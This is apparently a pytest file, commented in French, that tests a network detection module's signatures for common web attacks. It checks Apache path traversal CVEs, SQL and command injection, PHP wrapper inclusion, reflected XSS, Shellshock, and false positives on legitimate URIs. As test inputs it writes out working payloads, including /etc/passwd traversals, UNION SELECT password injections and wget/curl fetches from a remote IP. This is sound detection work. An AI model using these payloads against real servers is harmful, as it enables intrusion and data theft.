# SPDX-License-Identifier: GPL-3.0-or-later
"""Signatures web courantes (issue #353) : traversees, injections.

Critere de l'issue : la requete `/.%2e/.%2e/etc/passwd` (CVE-2021-41773)
est detectee. Avant #353, la signature `apache-path-traversal` exigeait un
« i » litteral apres la sequence (drapeau /i transpose dans le motif) et
ne pouvait jamais correspondre.
"""

from __future__ import annotations

from types import SimpleNamespace

import pytest

from netcross_core.exploit_signatures import detect_exploits, load_signatures

SIGNATURES = load_signatures()


def _get(uri: str, body: bytes = b"", user_agent: str = "curl/8.5.0") -> SimpleNamespace:
    method = "POST" if body else "GET"
    payload = f"{method} {uri} HTTP/1.1\r\nHost: srv\r\nUser-Agent: {user_agent}\r\n\r\n".encode() + body
    return SimpleNamespace(
        ts=1.0,
        frame_number=1,
        proto="TCP",
        src="192.0.2.10",
        sport=40000,
        dst="198.51.100.5",
        dport=80,
        payload=payload,
        payload_hash="h",
    )


def _ids(uri: str, body: bytes = b"", user_agent: str = "curl/8.5.0") -> set[str]:
    return {d.signature_id for d in detect_exploits([_get(uri, body, user_agent)], SIGNATURES)}


def test_requete_de_l_issue_detectee_avec_la_cve():
    detections = detect_exploits([_get("/.%2e/.%2e/etc/passwd")], SIGNATURES)
    by_id = {d.signature_id: d for d in detections}
    assert "apache-path-traversal" in by_id
    assert "CVE-2021-41773" in by_id["apache-path-traversal"].cves
    assert by_id["apache-path-traversal"].target == "http_uri"


@pytest.mark.parametrize(
    "uri",
    [
        "/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh",
        "/icons/.%%32%65/.%%32%65/etc/passwd",  # CVE-2021-42013 (double encodage)
        "/icons/%2e%2e/%2e%2e/etc/passwd",
        "/icons/%252e%252e/%252e%252e/etc/passwd",
        "/icons/%2E./%2E./etc/passwd",
    ],
)
def test_variantes_encodees_apache(uri):
    assert "apache-path-traversal" in _ids(uri)


def test_traversee_en_clair_generique_sans_cve_apache():
    """Un '../' en clair n'est pas propre a Apache 2.4.49 : signature generique seule."""
    ids = _ids("/../../etc/passwd")
    assert "path-traversal" in ids
    assert "apache-path-traversal" not in ids


@pytest.mark.parametrize(
    ("uri", "body", "expected"),
    [
        ("/download?file=../etc/passwd", b"", "path-traversal"),
        ("/view?f=..%5c..%5cwindows%5cwin.ini", b"", "path-traversal"),
        ("/item?id=1%27%20UNION%20SELECT%20password%20FROM%20users--", b"", "sql-injection"),
        ("/item?id=1'+OR+'1'='1", b"", "sql-injection"),
        ("/item?id=1%20AND%20SLEEP(5)", b"", "sql-injection"),
        ("/item?id=1;DROP TABLE users", b"", "sql-injection"),
        ("/login", b"user=admin'+or+1=1--&pw=x", "sql-injection"),
        ("/ping?host=8.8.8.8;id", b"", "command-injection"),
        ("/run?cmd=%3Bcat%20/etc/passwd", b"", "command-injection"),
        ("/x?h=a|wget+http://203.0.113.9/s", b"", "command-injection"),
        ("/x?h=$(curl -s http://203.0.113.9/s)", b"", "command-injection"),
        ("/index.php?page=php://filter/convert.base64-encode/resource=index", b"", "php-wrapper-inclusion"),
        ("/index.php?page=file:///etc/passwd", b"", "php-wrapper-inclusion"),
        ("/search?q=<script>alert(1)</script>", b"", "xss-reflected"),
        ("/search?q=%3Csvg/onload=alert(1)%3E", b"", "xss-reflected"),
    ],
)
def test_attaques_courantes_detectees(uri, body, expected):
    assert expected in _ids(uri, body)


def test_shellshock_dans_le_user_agent_sans_doublon_injection_de_commande():
    ids = _ids("/", user_agent="() { :; }; /bin/bash -c id")
    assert "shellshock-env-function" in ids
    assert "command-injection" not in ids


@pytest.mark.parametrize(
    "uri",
    [
        "/index.html?lang=fr&page=2",
        "/static/app.min.js?v=1.2.3",
        "/search?q=l'or+et+l'argent",
        "/search?q=it's+or+nothing",
        "/search?q=rock+%26+roll",
        "/search?q=sleep+well",
        "/search?q=id+card",
        "/api/items?sort=-date&fields=id,name",
        "/wiki/Union_Pacific",
        "/select?union=1",
        "/docs/./page",
        "/a/b/../c",
        "/files/..hidden/x",
        "/?redirect=https://example.com/x?y=1",
        "/api/v1/users/42;jsessionid=ABC123",
    ],
)
def test_uri_legitimes_sans_detection(uri):
    assert _ids(uri) == set()


def test_corps_html_legitime_sans_xss():
    """La signature XSS ne regarde que l'URI : un CMS poste du HTML legitime."""
    assert _ids("/post", b"title=Test&body=<p>Bonjour <script src=/a.js></script></p>") == set()


def test_toutes_les_nouvelles_signatures_chargees():
    ids = {s.id for s in SIGNATURES}
    assert {"path-traversal", "sql-injection", "command-injection", "php-wrapper-inclusion", "xss-reflected"} <= ids
